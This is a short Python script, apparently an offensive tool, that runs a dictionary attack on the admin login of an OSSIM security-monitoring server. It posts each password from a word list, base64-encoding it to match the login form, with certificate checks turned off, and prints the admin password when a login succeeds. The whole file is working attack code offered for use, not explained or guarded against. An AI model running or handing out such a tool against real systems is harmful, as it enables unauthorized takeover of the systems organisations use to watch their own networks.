#!/usr/bin/env python3

# OSSIM Login Bruteforce

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import base64
import logging
import os
import requests
import urllib3
from colorama import Fore, Style
from colorama import init

init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# %%%%%%%%%%% Constants %%%%%%%%%%%#

SEPARATOR = "[*] {0} [*]".format('=' * 110)

# %%%%%%%%%% Functions %%%%%%%%%#

def ossim_brute(ossimip):

	url = "https://" + ossimip + "/ossim/session/login.php"
	__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
	file = open(os.path.join(__location__, 'dict.txt'))
	successurl = "https://" + ossimip + "/ossim/"
	bruteforceresult = 0

	for line in file:

		ossimpassword = line.strip('\n\r')
		ossimpasswordb64 = base64.b64encode(ossimpassword.encode("utf-8"))
		base64string = str(ossimpasswordb64, "utf-8")
		params = {'embed': '', 'bookmark_string': '', 'user': 'admin', 'passu': ossimpassword,
					'pass': base64string}

		try:
			response = requests.post(url, params = params, verify = False)

			if response.status_code == 302 or response.url == successurl:
				print(SEPARATOR)
				print("[!] Dictionary Attack Successful!")
				print(SEPARATOR)
				print("[!] Username: " + Fore.RED + Style.BRIGHT + "admin")
				print(Style.RESET_ALL + "[!] Password: " + Fore.RED + Style.BRIGHT + ossimpassword)
				print(Style.RESET_ALL + SEPARATOR)
				bruteforceresult = 1
				break

		except Exception as e:
			logging.error(e, exc_info = True)

	if not bruteforceresult:
		print(SEPARATOR)
		print("[!] Dictionary Attack Not Successful")
		print(SEPARATOR)

# %%%%%%%%%% The End %%%%%%%%%%#
